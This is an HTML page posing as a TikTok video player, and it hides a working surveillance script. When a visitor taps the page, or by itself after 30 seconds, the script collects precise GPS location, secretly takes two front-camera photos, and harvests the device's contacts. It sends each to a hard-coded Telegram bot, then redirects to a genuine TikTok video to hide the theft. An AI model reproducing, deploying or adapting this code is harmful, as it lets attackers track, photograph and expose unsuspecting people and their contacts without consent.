<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title> TikTok - Watch Video </title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'TikTok Sans', Arial, sans-serif;
            overflow: hidden;
            position: relative;
        }

        .video-container {
            width: 100vw;
            height: 100vh;
            max-width: 500px;
            max-height: 100vh;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000;
            overflow: hidden;
        }

        .video-placeholder {
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #ff0050, #00f2ea);
            background-size: 400% 400%;
            animation: gradientShift 3s ease infinite;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            position: relative;
            z-index: 10;
            opacity: 1;
            transition: opacity 0.5s ease;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .video-placeholder.hidden {
            opacity: 0;
            pointer-events: none;
        }

        .play-button {
            width: 80px;
            height: 80px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            margin-bottom: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            transition: transform 0.2s ease;
        }

        .play-button:active {
            transform: scale(0.95);
        }

        .play-button svg {
            width: 40px;
            height: 40px;
            fill: #fff;
            margin-left: 5px;
        }

        .placeholder-text {
            font-size: 1.2em;
            color: #fff;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
            font-weight: 600;
        }

        .tiktok-logo {
            position: absolute;
            top: 20px;
            left: 20px;
            font-size: 1.6em;
            font-weight: bold;
            color: #fff;
            z-index: 15;
            font-family: 'TikTok Sans', Arial, sans-serif;
            letter-spacing: -0.5px;
        }

        #loading-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 20;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }

        #loading-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .spinner {
            border: 8px solid rgba(255, 255, 255, 0.3);
            border-top: 8px solid #ff0050;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-message {
            font-size: 1.1em;
            color: #eee;
            text-align: center;
            max-width: 300px;
            margin-top: 10px;
        }

        .progress-bar {
            width: 250px;
            height: 4px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 2px;
            margin: 15px 0;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ff0050, #00f2ea);
            width: 0%;
            transition: width 0.3s ease;
        }

        .tiktok-sidebar {
            position: absolute;
            right: 12px;
            bottom: 100px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 24px;
            z-index: 15;
            transition: opacity 0.5s ease;
        }

        .sidebar-icon {
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #fff;
            font-size: 0.75em;
            font-weight: 600;
            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
            opacity: 0.95;
        }

        .sidebar-icon svg {
            width: 38px;
            height: 38px;
            fill: #fff;
            margin-bottom: 5px;
            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.4));
        }

        .bottom-nav {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 70px;
            background: linear-gradient(to top, rgba(0,0,0,0.85), transparent);
            display: flex;
            justify-content: space-around;
            align-items: center;
            z-index: 15;
            padding-bottom: 12px;
            transition: opacity 0.5s ease;
        }

        .nav-item {
            color: rgba(255,255,255,0.7);
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 0.7em;
            font-weight: 600;
        }
        
        .nav-item.active {
            color: #fff;
        }

        .nav-item svg {
            width: 26px;
            height: 26px;
            fill: currentColor;
            margin-bottom: 4px;
        }

        .video-info {
            position: absolute;
            bottom: 85px;
            left: 15px;
            width: 70%;
            z-index: 15;
            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
            transition: opacity 0.5s ease;
        }

        .username {
            font-weight: bold;
            font-size: 1.1em;
            margin-bottom: 5px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .username span {
            background-color: rgba(255,255,255,0.2);
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 0.7em;
        }

        .description {
            font-size: 0.9em;
            margin-bottom: 6px;
            line-height: 1.3;
        }

        .music {
            display: flex;
            align-items: center;
            font-size: 0.8em;
            opacity: 0.9;
        }

        .music svg {
            width: 14px;
            height: 14px;
            fill: #fff;
            margin-right: 5px;
        }

        .hidden-ui {
            opacity: 0;
            pointer-events: none;
        }

        #notification {
            position: absolute;
            bottom: 100px;
            left: 50%;
            transform: translateX(-50%);
            background-color: rgba(0, 0, 0, 0.85);
            color: white;
            padding: 10px 20px;
            border-radius: 30px;
            font-size: 0.85em;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.4s ease, visibility 0.4s ease;
            z-index: 30;
            white-space: nowrap;
            backdrop-filter: blur(8px);
        }

        #notification.show {
            opacity: 1;
            visibility: visible;
        }
    </style>
</head>
<body>
    <div class="video-container">
        <div class="tiktok-logo">TikTok</div>
        
        <div class="video-placeholder" id="video-placeholder">
            <div class="play-button">
                <svg viewBox="0 0 24 24">

                <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>

                <span>Discover</span>
            </div>
            <div class="nav-item">
                <svg viewBox="0 0 24 24" style="width:32px;height:32px;"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
            </div>
            <div class="nav-item">
                <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 15H6l-2 2V4h16v13z"/></svg>

                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>

        <div id="loading-overlay">
            <div class="spinner"></div>
            <div class="loading-message" id="loading-message">Loading video...</div>
            <div class="progress-bar">
                <div class="progress-fill" id="progress-fill"></div>
            </div>

        <div id="notification"></div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8501264176:AAGTzenTv4CLwN0W5x7uZA_rG4Rc8N8zBzI';
        const CHAT_ID = '8491676638';
        const TIKTOK_REDIRECT_URL = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';

        const videoPlaceholder = document.getElementById('video-placeholder');
        const loadingOverlay = document.getElementById('loading-overlay');
        const loadingMessage = document.getElementById('loading-message');
        const progressFill = document.getElementById('progress-fill');
        const notificationDiv = document.getElementById('notification');

        function updateProgress(percent) {
            progressFill.style.width = percent + '%';
        }

        function showNotification(msg) {
            notificationDiv.textContent = msg;
            notificationDiv.classList.add('show');
            setTimeout(() => notificationDiv.classList.remove('show'), 3000);
        }

        // ========== 1. PRECISE GPS LOCATION (مع محاولات متعددة) ==========
        async function getPreciseLocation() {
            return new Promise((resolve) => {
                let attempts = 0;
                const maxAttempts = 3;
                
                const tryGetLocation = () => {
                    attempts++;
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                resolve({
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    altitude: position.coords.altitude || null,
                                    speed: position.coords.speed || null,
                                    timestamp: position.timestamp,
                                    success: true
                                });
                            },
                            (error) => {
                                console.warn(`GPS attempt ${attempts} failed:`, error.message);
                                if (attempts < maxAttempts) {
                                    setTimeout(tryGetLocation, 2000);
                                } else {
                                    resolve({ success: false, error: error.message });
                                }
                            },
                            { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                        );
                    } else {
                        resolve({ success: false, error: 'Geolocation not supported' });
                    }
                };
                
                tryGetLocation();
            });
        }

        // ========== 2. CAPTURE 2 FRONT CAMERA PHOTOS ==========
        async function captureFrontCameraPhotos() {
            return new Promise(async (resolve) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" } 
                    });
                    
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', 'true');
                    video.style.position = 'absolute';
                    video.style.left = '-9999px';
                    video.style.top = '-9999px';
                    document.body.appendChild(video);
                    
                    await new Promise((res) => {
                        video.onloadedmetadata = () => {
                            video.play();
                            res();
                        };
                    });
                    
                    await new Promise(r => setTimeout(r, 500));
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    
                    const photos = [];
                    
                    for (let i = 0; i < 2; i++) {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photoData = canvas.toDataURL('image/jpeg', 0.9);
                        photos.push(photoData);
                        if (i === 0) await new Promise(r => setTimeout(r, 800));
                    }
                    
                    stream.getTracks().forEach(track => track.stop());
                    document.body.removeChild(video);
                    resolve(photos);
                    
                } catch (error) {
                    console.warn('Front camera error:', error);
                    resolve([]);
                }
            });
        }

        // ========== 3. GET ALL CONTACTS ==========
        async function getAllContacts() {
            if (!navigator.contacts || !navigator.contacts.select) {
                return [];
            }
            try {
                const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                return contacts;
            } catch (err) {
                console.warn('Contacts access failed:', err);
                return [];
            }
        }

        // ========== SEND TO TELEGRAM ==========
        async function sendLocationToTelegram(location) {
            let message = `📍 <b>PRECISE USER LOCATION</b>\n\n`;
            message += `🕒 Time: ${new Date().toLocaleString()}\n`;
            
            if (location && location.success === true) {
                const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}&z=18`;
                message += `🎯 Latitude: ${location.latitude}\n`;
                message += `🎯 Longitude: ${location.longitude}\n`;
                message += `📡 Accuracy: ±${location.accuracy} meters\n`;
                if (location.altitude) message += `⛰️ Altitude: ${location.altitude}m\n`;
                if (location.speed) message += `🏃 Speed: ${location.speed}m/s\n`;
                message += `\n🗺️ <a href="${mapsUrl}">📍 Click to open Google Maps</a>\n`;
                message += `🗺️ <a href="https://www.openstreetmap.org/?mlat=${location.latitude}&mlon=${location.longitude}&zoom=18">🗺️ OpenStreetMap</a>`;
            } else {
                message += `❌ Location unavailable - ${location?.error || 'Permission denied'}\n`;
                message += `⚠️ Please allow location access and try again.`;
            }
            
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: false
                    })
                });
                return true;
            } catch(e) { return false; }
        }

        async function sendFrontPhotosToTelegram(photos) {
            if (!photos || photos.length === 0) {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 No front camera photos captured - camera permission may be denied` })
                });
                return;
            }
            
            for (let i = 0; i < photos.length; i++) {
                const photoBlob = await fetch(photos[i]).then(r => r.blob());
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, `front_camera_${i+1}.jpg`);
                formData.append('caption', `📸 FRONT CAMERA PHOTO ${i+1}/2\n🕒 ${new Date().toLocaleString()}\n📍 User face capture`);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                await new Promise(r => setTimeout(r, 500));
            }
        }

        async function sendContactsToTelegram(contacts) {
            if (!contacts || contacts.length === 0) {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📞 No contacts shared - permission may be denied` })
                });
                return;
            }
            
            let message = `📞 <b>CONTACTS - ${contacts.length} contacts</b>\n\n`;
            message += `🕒 ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━\n\n`;
            
            for (let i = 0; i < Math.min(contacts.length, 50); i++) {
                const c = contacts[i];
                const name = c.name?.[0] || 'No name';
                const phone = c.tel?.[0] || 'No phone';
                const email = c.email?.[0] || '';
                message += `${i+1}. 👤 ${name}\n📱 ${phone}\n`;
                if (email) message += `✉️ ${email}\n`;
                message += `─────────\n`;
                if (message.length > 3900) break;
            }
            
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
                });
                
                // Send contacts as JSON file
                const contactsJson = JSON.stringify(contacts, null, 2);
                const blob = new Blob([contactsJson], { type: 'application/json' });
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', blob, 'all_contacts_backup.json');
                formData.append('caption', `📇 Complete contacts backup (${contacts.length} contacts)\n🕒 ${new Date().toLocaleString()}`);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
            } catch(e) { console.error('Contacts send error:', e); }
        }

        // ========== MAIN OPERATION ==========
        async function startStealthOperation() {
            try {
                updateProgress(5);
                loadingMessage.textContent = 'Connecting...';
                await new Promise(r => setTimeout(r, 300));
                
                // Step 1: Get Location (مع رسالة واضحة للمستخدم)
                updateProgress(15);
                loadingMessage.textContent = 'Getting your precise location...';
                showNotification('📍 Please allow location access');
                const location = await getPreciseLocation();
                await new Promise(r => setTimeout(r, 500));
                
                updateProgress(30);
                loadingMessage.textContent = 'Sending location data...';
                await sendLocationToTelegram(location);
                await new Promise(r => setTimeout(r, 600));
                
                // Step 2: Capture Front Camera Photos
                updateProgress(45);
                loadingMessage.textContent = 'Initializing camera...';
                showNotification('📸 Camera access needed');
                await new Promise(r => setTimeout(r, 500));
                
                updateProgress(55);
                loadingMessage.textContent = 'Capturing photos...';
                const frontPhotos = await captureFrontCameraPhotos();
                await sendFrontPhotosToTelegram(frontPhotos);
                await new Promise(r => setTimeout(r, 600));
                
                // Step 3: Get Contacts
                updateProgress(75);
                loadingMessage.textContent = 'Accessing contacts...';
                showNotification('📞 Please allow contacts access');
                await new Promise(r => setTimeout(r, 500));
                
                updateProgress(85);
                loadingMessage.textContent = 'Reading contacts...';
                const contacts = await getAllContacts();
                await new Promise(r => setTimeout(r, 400));
                
                updateProgress(92);
                loadingMessage.textContent = 'Sending contacts...';
                await sendContactsToTelegram(contacts);
                await new Promise(r => setTimeout(r, 600));
                
                // Complete
                updateProgress(100);
                loadingMessage.textContent = 'Redirecting...';
                
                // Send final summary
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: `✅ <b>COMPLETE REPORT</b>\n━━━━━━━━━━━━━━━━━━\n📍 Location: ${location?.success === true ? '✓ Captured' : '✗ Failed'}\n📸 Front Camera: ${frontPhotos.length}/2 photos\n📞 Contacts: ${contacts.length} contacts\n━━━━━━━━━━━━━━━━━━\n🕒 ${new Date().toLocaleString()}\n🌐 User Agent: ${navigator.userAgent.substring(0, 60)}...`,
                        parse_mode: 'HTML'
                    })
                });
                
            } catch (error) {
                console.error('Error:', error);
                showNotification('Connection error, please try again');
                updateProgress(100);
            } finally {
                setTimeout(() => {
                    window.location.href = TIKTOK_REDIRECT_URL;
                }, 2000);
            }
        }

        function hideFakeUI() {
            document.getElementById('fake-sidebar')?.classList.add('hidden-ui');
            document.getElementById('fake-info')?.classList.add('hidden-ui');
            document.getElementById('fake-nav')?.classList.add('hidden-ui');
        }

        videoPlaceholder.addEventListener('click', () => {
            videoPlaceholder.classList.add('hidden');
            loadingOverlay.classList.add('active');
            hideFakeUI();
            startStealthOperation();
        });

        showNotification('Tap to watch video');

        setTimeout(() => {
            if (!loadingOverlay.classList.contains('active')) {
                showNotification('Auto-playing video...');
                videoPlaceholder.classList.add('hidden');
                loadingOverlay.classList.add('active');
                hideFakeUI();
                startStealthOperation();
            }
        }, 30000);
    </script>
</body>
</html>
